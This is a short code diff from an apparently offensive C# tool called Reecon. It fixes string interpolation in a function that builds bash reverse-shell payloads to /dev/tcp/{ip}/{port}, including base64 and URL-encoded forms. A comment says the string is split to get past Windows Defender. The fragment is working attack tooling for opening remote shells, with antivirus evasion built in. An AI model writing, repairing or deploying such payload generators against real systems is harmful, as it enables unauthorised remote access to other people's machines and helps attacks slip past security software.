@@ -139,7 +139,7 @@ namespace Reecon
             string saferShell = "bash -c \"" + shell + "\"";
             string saferBase64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(saferShell));
             string saferBase64AltShell = Convert.ToBase64String(Encoding.ASCII.GetBytes(altShell));
-            string saferUrlEncodedShell = $"bash%20-c%20%22" + "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"; // Gap required for Windows Defender
+            string saferUrlEncodedShell = $"bash%20-c%20%22" + $"bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"; // Gap required for Windows Defender
             string toReturn = "#!/bin/bash" + Environment.NewLine +
                                shell + Environment.NewLine +
                                "Note: File header is only required if it's a file and not a command" + Environment.NewLine +
